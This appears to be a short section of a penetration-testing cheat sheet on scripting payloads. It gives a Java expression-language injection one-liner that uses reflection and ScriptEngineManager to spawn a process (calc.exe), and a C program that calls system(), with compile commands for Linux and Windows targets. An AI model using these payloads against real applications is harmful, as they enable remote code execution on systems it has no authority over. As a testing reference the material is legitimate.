# Scripting

## Java

It uses an expression language.

```java
"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var proc=new java.lang.ProcessBuilder[\\"(java.lang.String[])\\"]([\\"cmd.exe\\",\\"/c\\",\\"calc.exe\\"]).start();")
```

## C

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
  char command[50] = "ls -lah\0";
  system(command);
  return 0;
}
```

Compile the payload depending on the operating system you want to target.

```
$ gcc -Wall -Wno-implicit -static -fno-stack-protector -z execstack -o payload payload.c

$ x86_64-w64-mingw32-gcc -o payload.exe payload.c
```